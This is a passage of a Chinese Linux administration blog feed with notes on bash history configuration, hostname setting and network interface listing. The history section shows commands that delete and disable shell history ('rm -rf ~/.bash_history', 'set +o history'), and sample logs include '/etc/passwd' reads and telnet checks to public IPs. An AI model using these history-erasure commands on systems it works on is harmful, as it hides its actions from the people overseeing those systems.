class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>   17  <span class="hljs-built_in">history</span> -w<br>   18  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   19  <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h3 id="set-o-history-启动记录历史记录（当前会话生效）"><a href="#set-o-history-启动记录历史记录（当前会话生效）" class="headerlink" title="set -o history 启动记录历史记录（当前会话生效）"></a>set -o history 启动记录历史记录（当前会话生效）</h3><h2 id="history配置"><a href="#history配置" class="headerlink" title="history配置"></a>history配置</h2><h3 id="history格式配置"><a href="#history格式配置" class="headerlink" title="history格式配置"></a>history格式配置</h3><h4 id="HISTTIMEFORMAT-增加操作时间"><a href="#HISTTIMEFORMAT-增加操作时间" class="headerlink" title="HISTTIMEFORMAT 增加操作时间"></a>HISTTIMEFORMAT 增加操作时间</h4><p>export HISTTIMEFORMAT&#x3D;”%F %T “</p><p>%d 天</p><p>%m 月</p><p>%y 年</p><p>%H 小时</p><p>%M 分钟</p><p>%S 秒</p><p>%F 日期完整格式 （Y-M-D格式：2022-08-14）</p><p>%T 时间完整格式（H:M:S格式：17:15:25）</p><p>%c 日期时间完整格式（2022年08月14日 星期日 17时25分30秒）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTTIMEFORMAT</span>=<span class="hljs-string">&quot;`whoami` %c  &quot;</span><br></code></pre></td></tr></table></figure><h4 id="HISTSIZE-history命令最大显示记录命令数（也就是执行history命令显示的命令条数）"><a href="#HISTSIZE-history命令最大显示记录命令数（也就是执行history命令显示的命令条数）" class="headerlink" title="HISTSIZE history命令最大显示记录命令数（也就是执行history命令显示的命令条数）"></a>HISTSIZE history命令最大显示记录命令数（也就是执行history命令显示的命令条数）</h4><p>export HISTSIZE &#x3D; 100</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history | more<br>   19  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  history<br>   20  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  history<br>   21  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  cat /root/.bash_history<br>   22  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  cat /etc/passwd<br>   23  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  su test<br>  ......<br>  112  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:36  history 5<br>  113  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:49  pwd a23<br>  114  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:25:12  vim /etc/bashrc<br>  115  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:26:29  ls<br>  116  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:26:35  cat /etc/bashrc<br>  117  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:27:25  vim /root/.bash_history<br>  118  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:28:11  history | more<br></code></pre></td></tr></table></figure><h4 id="HISTFILESIZE-bash-history文件保存记录最大数"><a href="#HISTFILESIZE-bash-history文件保存记录最大数" class="headerlink" title="HISTFILESIZE .bash_history文件保存记录最大数"></a>HISTFILESIZE .bash_history文件保存记录最大数</h4><p>export HISTFILESIZE&#x3D;10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># history</span><br>    1  root 2022年08月14日 星期日 17时32分30秒  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    2  root 2022年08月14日 星期日 17时32分49秒  <span class="hljs-built_in">history</span><br>    3  root 2022年08月14日 星期日 17时34分05秒  <span class="hljs-built_in">date</span><br>    4  root 2022年08月14日 星期日 17时34分38秒  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  root 2022年08月14日 星期日 17时34分42秒  <span class="hljs-built_in">history</span> -w<br>    6  root 2022年08月14日 星期日 17时36分56秒  <span class="hljs-built_in">cat</span> /root/.bash_history<br>    7  root 2022年08月14日 星期日 17时47分24秒  <span class="hljs-built_in">pwd</span><br>    8  root 2022年08月14日 星期日 17时47分28秒  <span class="hljs-built_in">ls</span> /tmp<br>    9  root 2022年08月14日 星期日 17时47分34秒  <span class="hljs-built_in">history</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># cat /root/.bash_history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469682</span><br><span class="hljs-built_in">history</span> -w<br><span class="hljs-comment">#1660469519</span><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660469532</span><br>vim /root/.bash_history<br><span class="hljs-comment">#1660469550</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469569</span><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660469645</span><br><span class="hljs-built_in">date</span><br><span class="hljs-comment">#1660469678</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469682</span><br><span class="hljs-built_in">history</span> -w<br><span class="hljs-comment">#1660469684</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-comment">#1660469130</span><br><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h3 id="history配置文件"><a href="#history配置文件" class="headerlink" title="history配置文件"></a>history配置文件</h3><p>新开终端加载新的配置文件</p><h4 id="etc-bashrc-通用配置文件"><a href="#etc-bashrc-通用配置文件" class="headerlink" title="&#x2F;etc&#x2F;bashrc 通用配置文件"></a>&#x2F;etc&#x2F;bashrc 通用配置文件</h4><p>增加配置后所有用户都会生效</p><h4 id="bashrc-各用户独立配置文件，也会加载主配置文件-etc-bashrc"><a href="#bashrc-各用户独立配置文件，也会加载主配置文件-etc-bashrc" class="headerlink" title="~&#x2F;.bashrc 各用户独立配置文件，也会加载主配置文件&#x2F;etc&#x2F;bashrc"></a>~&#x2F;.bashrc 各用户独立配置文件，也会加载主配置文件&#x2F;etc&#x2F;bashrc</h4><p>root默认配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># ls ~/.bashrc -l</span><br>-rw-r--r--. 1 root root 176 12月 29 2013 /root/.bashrc<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># cat ~/.bashrc</span><br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">rm</span>=<span class="hljs-string">&#x27;rm -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cp</span>=<span class="hljs-string">&#x27;cp -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">mv</span>=<span class="hljs-string">&#x27;mv -i&#x27;</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>普通用户默认配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Uncomment the following line if you don&#x27;t like systemctl&#x27;s auto-paging feature:</span><br><span class="hljs-comment"># export SYSTEMD_PAGER=</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br></code></pre></td></tr></table></figure><p>配置示例</p><p>root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># cat ~/.bashrc</span><br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">rm</span>=<span class="hljs-string">&#x27;rm -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cp</span>=<span class="hljs-string">&#x27;cp -i&#x27;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">mv</span>=<span class="hljs-string">&#x27;mv -i&#x27;</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br><br>HISTTIMEFORMAT=<span class="hljs-string">&quot;%F &quot;</span><br></code></pre></td></tr></table></figure><p>root history</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history<br>    1  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 27.221.32.84 3317<br>    2  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.111 6379<br>    3  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.64 8500<br>    4  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.126.54.207 3389<br>    5  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> telnet 123.125.204.111 6379<br>    6  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls<br>    7  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls ~/.bashrc<br>    8  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> ls ~/.bashrc -l<br>    9  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> cat ~/.bashrc<br>   10  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br>   11  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> vim /etc/bashrc<br>   12  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> source /etc/bashrc<br>   13  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br>   14  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> source /etc/bashrc<br>   15  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br></code></pre></td></tr></table></figure><p>test</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bashrc<br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ -f /etc/bashrc ]; <span class="hljs-keyword">then</span><br>. /etc/bashrc<br><span class="hljs-keyword">fi</span><br>HISTTIMEFORMAT=<span class="hljs-string">&quot;%c &quot;</span><br><span class="hljs-comment"># Uncomment the following line if you don&#x27;t like systemctl&#x27;s auto-paging feature:</span><br><span class="hljs-comment"># export SYSTEMD_PAGER=</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br></code></pre></td></tr></table></figure><p>source ~&#x2F;.bashrc</p><p>test history</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    2  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span> -w<br>    3  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    4  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span> -w<br>    5  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    6  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">ls</span> -lat ~/.bash_history<br>    7  2022年08月13日 星期六 22时56分56秒 <span class="hljs-built_in">history</span><br>    8  2022年08月13日 星期六 22时57分01秒 lll<br>    9  2022年08月13日 星期六 22时57分03秒 <span class="hljs-built_in">history</span><br>   10  2022年08月14日 星期日 10时41分01秒 <span class="hljs-built_in">exit</span><br>   11  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>   12  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">cat</span> ~/.bashrc<br>   13  2022年08月16日 星期二 23时09分53秒 vim ~/.bashrc<br>   14  2022年08月16日 星期二 23时10分59秒 <span class="hljs-built_in">source</span> ~/.bashrc<br>   15  2022年08月16日 星期二 23时11分01秒 <span class="hljs-built_in">history</span><br>   16  2022年08月16日 星期二 23时11分27秒 <span class="hljs-built_in">cat</span> ~/.bashrc<br>   17  2022年08月16日 星期二 23时12分14秒 vim ~/.bashrc<br>   18  2022年08月16日 星期二 23时12分28秒 <span class="hljs-built_in">source</span> ~/.bashrc<br>   19  2022年08月16日 星期二 23时12分42秒 <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p>默认情况下，</p><p>配置文件示例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTTIMEFORMAT</span>=<span class="hljs-string">&quot;`whoami` %c  &quot;</span><br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTSIZE</span>=100<br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTFILESIZE</span>=10<br></code></pre></td></tr></table></figure><h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><p>1、默认情况下退出终端（会话）后，会将历史记录写入～&#x2F;.bash_history文件</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hostname</title>
    <link href="/2024/04/03/yunwei/commands/hostname/"/>
    <url>/2024/04/03/yunwei/commands/hostname/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>显示系统主机名</p><h2 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h2><p>命令</p><p>hostname </p><p>cenots6：读取的是 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@rdimtools1.ops.xlzbb1 /tmp]</span><span class="hljs-comment"># cat /etc/sysconfig/network</span><br><span class="hljs-attr">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">HOSTNAME</span>=rdimtools1.ops.xlzbb1.sinanode.com<br></code></pre></td></tr></table></figure><p>centos7,8&#x2F;ubuntu：读取的是 &#x2F;etc&#x2F;hostname中的值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> cron.d]<span class="hljs-meta"># cat /etc/hostname</span><br><span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><h2 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h2><p>centos6可以设置带有”:”这种特殊字符的主机名。</p><p>​存在本机使用SMTP时，ehlo报错。</p><p>centos7不可以设置带有”:”这种特殊字符的主机名</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">(base) [root@<span class="hljs-number">110</span> ~]# <span class="hljs-built_in">hostname</span> <span class="hljs-number">110</span>:<span class="hljs-number">1234</span><br><span class="hljs-built_in">hostname</span>: the specified <span class="hljs-built_in">hostname</span> <span class="hljs-keyword">is</span> invalid<br></code></pre></td></tr></table></figure><h3 id="临时设置"><a href="#临时设置" class="headerlink" title="临时设置"></a>临时设置</h3><p><strong>hostname 主机名</strong></p><p>不需要重启，新开终端之后就是新设置的hostname</p><p>重启之后，临时hostname失效</p><h3 id="永久设置"><a href="#永久设置" class="headerlink" title="永久设置"></a>永久设置</h3><p>需要重启</p><p><strong>hostnamectl命令方式</strong></p><p>hostnamectl set-hostname hostname</p><p>会修改&#x2F;etc&#x2F;hostname的文件内容</p><p><strong>修改文件方式</strong></p><p>centos6</p><p>修改 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的HOSTNAME字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vim /etc/sysconfig<span class="hljs-built_in">/network</span><br><span class="hljs-built_in"></span><br><span class="hljs-attribute">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attribute">HOSTNAME</span>=iZ8vb4dup6si15ggr13rt4Z<br><span class="hljs-attribute">NETWORKING_IPV6</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">PEERNTP</span>=<span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><p>centos7</p><p>修改&#x2F;etc&#x2F;hostname中的内容即可</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/<span class="hljs-built_in">hostname</span><br><br><span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><h3 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h3><p>获取服务器主机名</p><p>hostnamectl</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">(base)</span> [<span class="hljs-string">root@120</span> <span class="hljs-string">~</span>]<span class="hljs-comment"># hostnamectl</span><br>   <span class="hljs-attr">Static hostname:</span> <span class="hljs-number">110</span><br>         <span class="hljs-attr">Icon name:</span> <span class="hljs-string">computer-vm</span><br>           <span class="hljs-attr">Chassis:</span> <span class="hljs-string">vm</span><br>        <span class="hljs-attr">Machine ID:</span> <span class="hljs-string">f0f31005fb5a436d88e3c6cbf54e25aa</span><br>           <span class="hljs-attr">Boot ID:</span> <span class="hljs-string">4304a1d611aa4086a7aeb527a884dbd1</span><br>    <span class="hljs-attr">Virtualization:</span> <span class="hljs-string">kvm</span><br>  <span class="hljs-attr">Operating System:</span> <span class="hljs-string">CentOS</span> <span class="hljs-string">Linux</span> <span class="hljs-number">7</span> <span class="hljs-string">(Core)</span><br>       <span class="hljs-attr">CPE OS Name:</span> <span class="hljs-string">cpe:/o:centos:centos:7</span><br>            <span class="hljs-attr">Kernel:</span> <span class="hljs-string">Linux</span> <span class="hljs-number">3.10</span><span class="hljs-number">.0</span><span class="hljs-number">-1160.36</span><span class="hljs-number">.2</span><span class="hljs-string">.el7.x86_64</span><br>      <span class="hljs-attr">Architecture:</span> <span class="hljs-string">x86-64</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ifdown</title>
    <link href="/2024/04/03/yunwei/commands/ifdown/"/>
    <url>/2024/04/03/yunwei/commands/ifdown/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="禁用网卡"><a href="#禁用网卡" class="headerlink" title="禁用网卡"></a>禁用网卡</h1><h2 id="查询网卡信息"><a href="#查询网卡信息" class="headerlink" title="查询网卡信息"></a>查询网卡信息</h2><p>使用<strong>ifconfig</strong>，不要使用<strong>ip a</strong></p><p>ip a 命令查询出来的网卡名存在问题</p><p>同台机器</p><p>ip  a : eth0.200@eth0</p><p>ifconfig :  eth0.200</p><p>示例：</p><p>ifconfig</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vim">[root@localhost tmp]# ifconfig<br>eth0      Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:552883003</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:253865444</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          RX byte<span class="hljs-variable">s:130369806378</span> (<span class="hljs-number">121.4</span> GiB)  TX byte<span class="hljs-variable">s:129966960922</span> (<span class="hljs-number">121.0</span> GiB)<br>          Interrup<span class="hljs-variable">t:35</span> <br><br>eth0.<span class="hljs-number">100</span>  Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet addr:<span class="hljs-number">10.122</span>.<span class="hljs-number">11.73</span>  Bcas<span class="hljs-variable">t:10</span>.<span class="hljs-number">122.11</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:232635875</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:216156572</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span> <br>          RX byte<span class="hljs-variable">s:102014135177</span> (<span class="hljs-number">95.0</span> GiB)  TX byte<span class="hljs-variable">s:125048629002</span> (<span class="hljs-number">116.4</span> GiB)<br><br>eth0.<span class="hljs-number">200</span>  Link encap:Ethernet  HWaddr <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>A:E9:<span class="hljs-number">6</span>D:<span class="hljs-number">84</span>  <br>          inet addr:<span class="hljs-number">27.221</span>.<span class="hljs-number">32.56</span>  Bcas<span class="hljs-variable">t:27</span>.<span class="hljs-number">221.32</span>.<span class="hljs-number">255</span>  Mask:<span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>          inet6 addr: fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:29247955</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:5423171</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br>          collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span> <br>          RX byte<span class="hljs-variable">s:1599611720</span> (<span class="hljs-number">1.4</span> GiB)  TX byte<span class="hljs-variable">s:765012049</span> (<span class="hljs-number">729.5</span> MiB)<br></code></pre></td></tr></table></figure><p>ip a</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pf">[root@localhost tmp]<span class="hljs-comment"># ip 